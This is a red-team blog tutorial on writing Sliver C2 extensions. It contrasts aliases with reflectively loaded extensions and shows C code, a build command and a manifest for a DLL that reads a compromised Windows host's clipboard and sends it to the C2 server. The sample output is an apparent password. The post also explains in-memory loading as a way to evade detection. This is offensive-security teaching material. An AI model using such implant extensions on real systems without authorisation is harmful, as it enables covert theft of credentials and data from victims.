# https://hackerforce.io/blog/writing-extensions-in-sliver-c2/

[Skip to main content](https://hackerforce.io/blog/writing-extensions-in-sliver-c2/#main-content)

[Share on X. Opens in a new tab](https://x.com/intent/tweet?text=Writing%20extensions%20in%20Sliver%20C2&url=https%3A%2F%2Fhackerforce.io%2Fblog%2Fwriting-extensions-in-sliver-c2%2F%3Futm_source%3Dx%26utm_medium%3Dsocial%26utm_campaign%3Dshare_button)[Share on Telegram. Opens in a new tab](https://t.me/share/url?url=https%3A%2F%2Fhackerforce.io%2Fblog%2Fwriting-extensions-in-sliver-c2%2F%3Futm_source%3Dtelegram%26utm_medium%3Dsocial%26utm_campaign%3Dshare_button&text=Writing%20extensions%20in%20Sliver%20C2)[Share on Reddit. Opens in a new tab](https://reddit.com/submit?url=https%3A%2F%2Fhackerforce.io%2Fblog%2Fwriting-extensions-in-sliver-c2%2F%3Futm_source%3Dreddit%26utm_medium%3Dsocial%26utm_campaign%3Dshare_button&title=Writing%20extensions%20in%20Sliver%20C2)[Share on Hacker News. Opens in a new tab](https://news.ycombinator.com/submitlink?u=https%3A%2F%2Fhackerforce.io%2Fblog%2Fwriting-extensions-in-sliver-c2%2F%3Futm_source%3Dhackernews%26utm_medium%3Dsocial%26utm_campaign%3Dshare_button&t=Writing%20extensions%20in%20Sliver%20C2)

HF INTELLIGENCE \| OFFENSIVE SECURITY

# Writing extensions in Sliver C2

Category: [Offensive Security](https://hackerforce.io/blog/category/offensive-security/)

Published:Oct 4, 2026

Operator: [@sunflower](https://hackerforce.io/blog/author/sunflower/)

Read Time:10 min read

Offensive Security

sliver c2 extensions armory red team pentest windows

Many red team operators would agree that, besides the invention of coffee, a [command-and-control (opens in a new tab)](https://en.wikipedia.org/wiki/Command_and_control#Computer_security_industry), or C2, framework has been amongst the most helpful tools. Everything from the generation of implants to establishing unconventional communication channels like [WireGuard (opens in a new tab)](https://www.wireguard.com/) and [mTLS (opens in a new tab)](https://en.wikipedia.org/wiki/Mutual_authentication#mTLS), C2s have made red team assessments far more effective. That said, by themselves alone they are, frankly, quite monolithic. Attempting to pack every operational capability into a single implant is impossible, not to mention what the size of such an implant would look like. Take [Sliver (opens in a new tab)](https://github.com/bishopfox/sliver), for example; its vanilla implants alone weigh in at around 10MB. Therefore, to extend their capability set, many C2 frameworks have introduced support for additional tools and extensions, and Sliver, from our perspective, provides by far the easiest implementation we have tested.

There are two ways custom tools can be executed through Sliver:

- [Aliases (opens in a new tab)](https://sliver.sh/docs/?name=Aliases+and+Extensions#aliases)
- [Extensions (opens in a new tab)](https://sliver.sh/docs/?name=Aliases+and+Extensions#extensions)

This article focuses primarily on extensions, though their true power becomes clear once you understand how aliases work. So, let’s first take a high-level look at how aliases function, before delving deeper into extensions.

## Aliases

Aliases in Sliver function in a very similar way to how its own native `sideload` and `execute-assembly` commands work. In fact, an alias is essentially just a thin wrapper around those existing commands, executing the alias assembly through the same method of [process injection (opens in a new tab)](https://attack.mitre.org/techniques/T1055/)), where it spawns a new sacrificial process, uses several [Donut (opens in a new tab)](https://github.com/thewover/donut) [APIs (opens in a new tab)](https://github.com/BishopFox/sliver/blob/e116a5ec3d26e8582348a29cfd251f915ce4a405/server/rpc/rpc-tasks.go#L149) to convert a given assembly to shellcode, load the [Common Language Runtime (opens in a new tab)](https://learn.microsoft.com/en-us/dotnet/standard/clr) (CLR) environment, and create a new [application domain (opens in a new tab)](https://learn.microsoft.com/en-us/dotnet/framework/app-domains/use) to execute whatever the tool is designed to perform. Quick, but dirty.

Every alias can be found within the `.sliver-client/aliases/` directory on the client system (note that the server does not keep track of them), in a separate directory for each installed alias. Each alias directory contains two important files:

- An `alias.json` [manifest file (opens in a new tab)](https://en.wikipedia.org/wiki/Manifest_file)
- An alias binary, either in the format of a .NET assembly (`.exe`) or a shared library (e.g. `.dll` for Windows, `.so` for Linux, etc.)

For example, [Rubeus (opens in a new tab)](https://github.com/ghostpack/rubeus), installed via the [Armory (opens in a new tab)](https://sliver.sh/docs/?name=Armory), contains:

TERMINAL

Copy

```
$ ls -al .sliver-client/aliases/rubeus/
total 464
drwx------ 2 hackerforce hackerforce   4096 Sep 30 15:18 .
drwx------ 4 hackerforce hackerforce   4096 Sep 30 15:18 ..
-rw------- 1 hackerforce hackerforce    583 Sep 30 15:18 alias.json
-rw------- 1 hackerforce hackerforce 462848 Sep 30 15:18 Rubeus.exe
```

Here, `Rubeus.exe` is the .NET assembly that gets loaded and executed as the alias. `alias.json`, on the other hand, is the manifest that instructs Sliver on how to execute the assembly, and contains other alias-specific metadata:

JSON

Copy

```
{
  "name": "Rubeus",
  "version": "v0.0.25",
  "command_name": "rubeus",
  "original_author": "@GhostPack (HarmJ0y)",
  "repo_url": "https://github.com/sliverarmory/Rubeus",
  "help": "Rubeus is a C# tool set for raw Kerberos interaction and abuses.",
  "entrypoint": "Main",
  "allow_args": true,
  "default_args": "",
  "is_reflective": false,
  "is_assembly": true,
  "files": [\
    {\
      "os": "windows",\
      "arch": "amd64",\
      "path": "Rubeus.exe"\
    },\
    {\
      "os": "windows",\
      "arch": "386",\
      "path": "Rubeus.exe"\
    }\
  ]
}
```

There are many fields here, most of which you can find [here (opens in a new tab)](https://sliver.sh/docs/?name=Aliases%20and%20Extensions#alias-fields); however, from the perspective of execution, the most important ones include:

- `command_name`, which specifies the actual client console command
- `entrypoint`, which identifies the [entry point (opens in a new tab)](https://learn.microsoft.com/en-us/dotnet/csharp/fundamentals/program-structure/main-command-line) for the alias (not necessary for .NET executables, but often included for completeness)
- `files`, which specifies the paths to the alias assemblies, as well as their supported systems and architectures

Besides these fields, another field you may occasionally come across involves `depends_on`. This field specifies a list of dependencies on which a given extension relies. Aliases, however, cannot have dependencies (other aliases or extensions) and must instead be a single shared library or .NET assembly to utilise. Extensions, on the other hand, can have dependencies, though their internals are currently beyond the scope of this article.

In summary, an alias is simply an assembly whose manifest tells Sliver how to run it. Its internal APIs then convert the assembly to shellcode, inject it into a sacrificial process and retrieve the results. Simple.

## Extensions

At this point, you may be wondering what other point of execution would be necessary if an alias already provides all that is necessary. Although extensions are also used to execute custom functionality, the way in which they do so differs. Whereas an alias is typically in the format of a standard .NET assembly, an extension comes in the format of a native shared library and, most importantly, rather than being loaded as part of a separate sacrificial process, it is [reflectively loaded (opens in a new tab)](https://attack.mitre.org/techniques/T1620/) into the existing implant process and passed several callbacks to return data to the C2 server. Through this model of execution, extensions provide a way to execute long-running modules within the implant process, rather than outside of it, as if they were native capabilities built into the implant itself.

If you’re new to reflective loading, this may be a peculiar concept at first, but it has been used for red teaming around for [many years (opens in a new tab)](https://github.com/stephenfewer/ReflectiveDLLInjection) now, and still stands strong. At a high level, it works by:

1. Allocating memory for the shared library within the current implant process
2. Moving the shared library into that memory block
3. Using a custom loader to replicate Windows’ loading order and load the shared library as it would be loaded natively

This means extensions do not spawn additional sacrificial processes, which is better for OPSEC, as it keeps the contents of a given tool entirely in memory without creating additional process-related artefacts. Therefore, we still retain the ability to execute custom tooling, but do so in a much more covert manner.

That said, extensions do have their downsides. Most critically, careless use of them (for example, running massive operations or using broken code) may crash the current implant process, potentially costing you access if no backup is available. In that case, always ensure you have a backup implant and perhaps most importantly, test your extensions beforehand to ensure optimal compatibility.

### Writing Extensions

Extensions are structurally similar to aliases. Each extension includes:

- A manifest, named `extension.json`
- The shared library that gets invoked

The manifest, albeit having a different name, is similar in content to the one used for aliases, and supports most of the same fields. Most importantly however, is the module itself. You can use any language that supports building and compiling shared libraries, but the key is to ensure that the implant understands how the module is implemented (that is, where its functionality resides) and that the module understands how to call back to the implant and what data it needs to return.

For this very reason, Sliver provides an [extension API (opens in a new tab)](https://github.com/BishopFox/sliver/blob/e116a5ec3d26e8582348a29cfd251f915ce4a405/implant/sliver/extension/extension_windows.go#L115) that consists of two primary parts:

C

Copy

```
typedef int (*goCallback)(const char*, int);

extern "C" {
	__declspec(dllexport) int __cdecl entrypoint(char* argsBuffer, uint32_t bufferSize, goCallback callback);
}
```

Here:

- `goCallback`, specifies the callback used to communicate output back to the C2 server and client interface
- `entrypoint`, an export for the entry point to the module’s functionality

Most of the extension’s code and functionality will be within the `entrypoint` function. It must be exported so that the implant can call it, and it will execute whatever is defined within it. For example, although your extension functionality will differ, the example below demonstrates a simple implementation showing how the Windows clipboard can be accessed and its contents extracted:

C

Copy

```
int entrypoint(char *argsBuffer, uint32_t bufferSize, goCallback callback) {
    // Open clipboard for reading
    if (OpenClipboard(NULL) == 0) {
        return 1;
    }

    HANDLE hClipboardData = GetClipboardData(CF_TEXT);
    if (hClipboardData == NULL) {
        CloseClipboard();
        return 1;
    }

    // Lock clipboard and return pointer to clipboard memory block
    CHAR *dataString = (CHAR *)GlobalLock(hClipboardData);
    if (dataString == NULL) {
        CloseClipboard();
        return 1;
    }

    // Unlock clipboard memory block
    GlobalUnlock(hClipboardData);
    CloseClipboard();

    // ...
}
```

As part of this snippet:

- `OpenClipboard`, opens the clipboard for reading
- `GetClipboardData`, retrieves current data from the clipboard in `CF_TEXT` format, which uses the standard [ASCII (opens in a new tab)](https://en.wikipedia.org/wiki/ASCII) character set (Sliver does not support output in [Unicode (opens in a new tab)](https://en.wikipedia.org/wiki/Unicode))

The remaining snippet returns a pointer to the block of memory holding the clipboard data and performs any necessary clean up if something goes wrong. The complete solution can be found [here (opens in a new tab)](https://github.com/HackerForceDev/getclipboarddata/blob/main/GetClipboardData.c).

Once execution is complete, the `goCallback` function returns the results to the server, where the initial `char*` parameter specifies the content being returned, and the following `int` parameter specifies the length of the returned data:

C

Copy

```
int entrypoint(char *argsBuffer, uint32_t bufferSize, goCallback callback) {
	// ...
	return callback(dataString, strlen(dataString));
}
```

Also, just keep in mind that `goCallback` can only be invoked once, so be sure to accomplish what the module needs to do before you call back.

Now that the extension module is ready, it needs to be compiled into a shared library. The method you use will depend on your environment. As I am running Linux, the `x86_64-w64-mingw32-gcc` compiler from [MinGW (opens in a new tab)](https://www.mingw-w64.org/) serves the purpose:

TERMINAL

Copy

```
$ x86_64-w64-mingw32-gcc GetClipboardData.c -o GetClipboardData.x64.dll -shared -Wall
$ file GetClipboardData.x64.dll
GetClipboardData.x64.dll: PE32+ executable for MS Windows 5.02 (DLL), x86-64, 19 sections
```

Excellent. To accompany this module, all that remains is an `extension.json` manifest, in which the `path` field (under `files`) points to our module, and `entrypoint` to the name of our exported function. Remember, this function contains the core functionality of our extension and is also aptly named `entrypoint`:

JSON

Copy

```
{
    "name": "GetClipboardData",
    "command_name": "GetClipboardData",
    "version": "0.0.2",
    "extension_author": "hackerforce",
    "original_author": "hackerforce",
    "repo_url": "https://github.com/HackerForceDev/getclipboarddata",
    "help": "A quick and dirty extension for Sliver C2 to retrieve the most recent data from a Windows host's clipboard.",
    "entrypoint": "entrypoint",
    "files": [\
        {\
            "os": "windows",\
            "arch": "amd64",\
            "path": "GetClipboardData.x64.dll"\
        }\
    ]
}
```

With all extension components in place, we will need to install it in Sliver. This requires us to package the extension into a directory (or, alternatively, a `.tar.gz` archive) and then use the `extensions install` command within the client, passing the directory or archive as the `path` argument:

TERMINAL

Copy

```
sliver > extensions install GetClipboardData

[*] Installing extension 'GetClipboardData' (0.0.2) ...
```

When executed, Sliver invokes the `ExtensionsInstallCmd` [function (opens in a new tab)](https://github.com/BishopFox/sliver/blob/e116a5ec3d26e8582348a29cfd251f915ce4a405/client/command/extensions/install.go#L35), which parses the `extension.json` manifest and copies all relevant files to the client’s directories.

Once installed, the extension can be loaded the next time the client is started or when the `extensions load` command is used:

TERMINAL

Copy

```
sliver > extensions load GetClipboardData

[*] Added GetClipboardData command: A quick and dirty extension for Sliver C2 to retrieve the most recent data from a Windows host's clipboard.
```

Here, Sliver invokes the `ExtensionsLoadCmd` [function (opens in a new tab)](https://github.com/BishopFox/sliver/blob/e116a5ec3d26e8582348a29cfd251f915ce4a405/client/command/extensions/load.go#L105), which loads and, via the `ExtensionRegisterCommand` [function (opens in a new tab)](https://github.com/BishopFox/sliver/blob/e116a5ec3d26e8582348a29cfd251f915ce4a405/client/command/extensions/load.go#L172), subsequently registers the extension within the client, thus making its command available from within the client interface.

Once inside an implant session, it can be tested:

TERMINAL

Copy

```
sliver > use f0b6a783-ce01-49a0-a2a7-336f2b44a02d

[*] Active session HACKER_FORCE (f0b6a783-ce01-49a0-a2a7-336f2b44a02d)

sliver (HACKER_FORCE) > GetClipboardData

[*] Successfully executed GetClipboardData
[*] Got output:
ILuvHF2026!
```

Here, Sliver calls the `runExtensionCmd` [function (opens in a new tab)](https://github.com/BishopFox/sliver/blob/e116a5ec3d26e8582348a29cfd251f915ce4a405/client/command/extensions/load.go#L307), which subsequently calls the `loadExtension` [function (opens in a new tab)](https://github.com/BishopFox/sliver/blob/e116a5ec3d26e8582348a29cfd251f915ce4a405/client/command/extensions/load.go#L223), whose purpose is to transfer the extension over to the implant using the `RegisterExtension` RPC [function (opens in a new tab)](https://github.com/BishopFox/sliver/blob/e116a5ec3d26e8582348a29cfd251f915ce4a405/client/command/extensions/load.go#L275). Once the extension has been registered within the implant, back in the `runExtensionCmd` function, the `CallExtension` RPC [function (opens in a new tab)](https://github.com/BishopFox/sliver/blob/8fe54f243eabea9815193b955f7069a4535974e2/server/rpc/rpc-extensions.go#L37) is invoked to call the extension, whereby the implant’s `callExtensionHandler` handler [function (opens in a new tab)](https://github.com/BishopFox/sliver/blob/e116a5ec3d26e8582348a29cfd251f915ce4a405/implant/sliver/handlers/handlers_windows.go#L710) executes the extension from its entry point.

As can be seen, the output returns `ILuvHF2026!`, which looks like a potential password.

## Summary

Although the examples in this article are simple, there should now be enough here to start building out custom extensions. We will revisit this concept in a future article, building on this extension to explore how extensions can support long-running background processes and enable ongoing interaction rather than one-off execution. However, that is beyond the scope of this article.

## Frequently Asked Questions

### //What are extensions in Sliver C2?

Extensions are compiled native shared libraries that provide custom tools and are reflectively loaded directly into an implant's process memory.

### //What is the difference between an alias and extension?

An alias acts as a thin wrapper around Sliver's execute-assembly and sideload commands, spawning a sacrificial process to inject a custom tool. Extensions, on the other hand, are reflectively loaded into the existing implant process, leaving minimal telemetry indicators.

### //What is reflective loading?

Reflective loading is an execution technique that loads code directly into memory rather than from a file on disk. Sliver extensions replicate this by using a custom loader to load and execute shared libraries in memory without interacting with the disk.

### //Can I build my own extensions?

Yes, and you don't need to be an advanced programmer to do so. As long as you understand that an extension requires a callback and an entry point, and have some basic system API programming knowledge, the rest is for your imagination.

NOTICE:Educational Use Only

Educational Use Only. This report is published for ethical cybersecurity education, defensive research, and authorised lab practice. Do not use the techniques, tools, or concepts described here against systems you do not own or have explicit permission to test. HackerForce does not endorse unauthorised access, abuse, or harmful activity.

PERSONNEL DOSSIER \| LOGGED BY

![Author dossier portrait for @sunflower](https://hackerforce.io/_astro/sunflower.BBDUNm7A_eKP7H.png)

NAME: [@sunflower](https://hackerforce.io/blog/author/sunflower/)

DESIGNATION:Public & courses lead

EXPERTISE:Red Teaming, Writing, Brand Strategy

Co-founder. Shapes the brand voice and technical report strategy, combining strong writing skills with red team methodologies.

[Back to Reports](https://hackerforce.io/blog/)

Related Briefings

## Similar Intel Signals

WriteupSep 21, 2026

### [Darkglass writeup: SMB enumeration to full compromise](https://hackerforce.io/blog/darkglass-writeup/)

A full walkthrough of Darkglass, covering anonymous SMB enumeration, privilege escalation and two unintended paths discovered along the way.

- windows
- service exploitation
- privilege escalation

By @ASX10 min read

TradecraftSep 19, 2026

### [Landing your first job in offensive security](https://hackerforce.io/blog/how-to-get-your-first-job-in-penetration-testing/)

No bootcamp, no fake certifications promises. Just the hard truth about landing your first job in offensive security.

- offensive security
- cybersecurity career
- pentest

By @ASX6 min read

PROVE THE TRADECRAFT

Reading about it only gets you so far.

Articles build understanding, not muscle memory. Practise these concepts yourself under realistic conditions in an isolated, scenario-driven lab.

[Enter the Armory](https://hackerforce.io/armory/)

Inevitable annoyance

Yes, we use cookies.

We have to show you this for legal reasons. The necessary ones keep the site from exploding, whilst the analytics ones let us track and analyse vanity metrics.

[Privacy Policy](https://hackerforce.io/privacy-policy/) [Cookie Policy](https://hackerforce.io/cookie-policy/)

Edit preferencesRejectAccept